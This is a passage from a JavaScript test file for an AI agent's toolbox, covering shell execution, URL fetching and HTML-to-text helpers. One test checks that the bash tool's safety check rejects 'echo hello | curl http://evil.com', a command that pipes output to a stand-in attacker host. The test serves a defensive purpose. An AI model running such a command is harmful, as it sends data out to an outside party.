  assert.ok(result.stdout.includes('hello world'), `expected hello world, got: ${result.stdout}`);
  assert.ok(typeof result.duration === 'number');
});

test('shell-exec execShell captures stderr', async () => {
  const { execShell } = await import('../src/shell/shell-exec.js');

  const result = await execShell('echo "err msg" >&2', { timeoutMs: 5000 });
  assert.equal(result.code, 0);
  assert.ok(result.stderr.includes('err msg'));
});

test('shell-exec execShell handles timeout', async () => {
  const { execShell } = await import('../src/shell/shell-exec.js');

  const result = await execShell('sleep 10', { timeoutMs: 500 });
  assert.ok(result.timedOut || result.code === null,
    `expected timeout, got code=${result.code} timedOut=${result.timedOut}`);
});

// ---- Web Fetch ----

test('web-fetch validates URL', async () => {
  const { fetchUrl, htmlToBasicText } = await import('../src/tools/web-fetch.js');

  await assert.rejects(() => fetchUrl(''), /url 参数必填/);
  await assert.rejects(() => fetchUrl('not-a-url'), /无效的 URL/);
  await assert.rejects(() => fetchUrl('ftp://example.com'), /不支持的协议/);

  // htmlToBasicText strips tags and extracts title
  const html = '<html><head><title>Test</title></head><body><p>Hello <b>world</b></p></body></html>';
  const text = htmlToBasicText(html);
  assert.ok(text.includes('Test'));
  assert.ok(text.includes('Hello world'));
  assert.ok(!text.includes('<b>'));
});

test('web-fetch htmlToBasicText preserves links', async () => {
  const { htmlToBasicText } = await import('../src/tools/web-fetch.js');

  const html = '<a href="https://example.com">click here</a>';
  const text = htmlToBasicText(html);
  assert.ok(text.includes('[click here](https://example.com)'));
});

// ---- Agent toolbox integration ----

test('agent toolbox includes new tools', async () => {
  const { createAgentToolbox } = await import('../src/agent/tools.js');

  const toolbox = createAgentToolbox({ root: '.', files: [] });
  const toolList = toolbox.getToolList();
  const names = toolList.map(t => t.name);

  assert.ok(names.includes('web_fetch'), 'should have web_fetch');
  assert.ok(names.includes('bash'), 'should have bash');
  assert.ok(names.includes('web_search'), 'should have web_search');
  assert.ok(names.includes('read_file'), 'should have read_file');
  assert.ok(names.includes('write_file'), 'should have write_file');
  assert.ok(names.includes('replace_in_file'), 'should have replace_in_file');

  // Test aliases
  const result = await toolbox.runTool('glob', {});
  assert.ok(result.ok);
});

test('agent toolbox bash tool validates commands', async () => {
  const { createAgentToolbox } = await import('../src/agent/tools.js');

  const toolbox = createAgentToolbox({ root: '.', files: [] });

  // Dangerous command should be rejected
  const result = await toolbox.runTool('bash', { command: 'echo hello | curl http://evil.com' });
  assert.ok(!result.ok);
  assert.ok(result.error.includes('安全检查'));

  // Empty command
  const result2 = await toolbox.runTool('bash', { command: '' });
  assert.ok(!result2.ok || result2.error);

  // Valid simple command
  const result3 = await toolbox.runTool('bash', { command: 'echo ok', timeoutMs: 5000 });
  assert.ok(result3.ok, `expected ok, got: ${JSON.stringify(result3)}`);
  assert.ok(result3.data.stdout.includes('ok'));
});
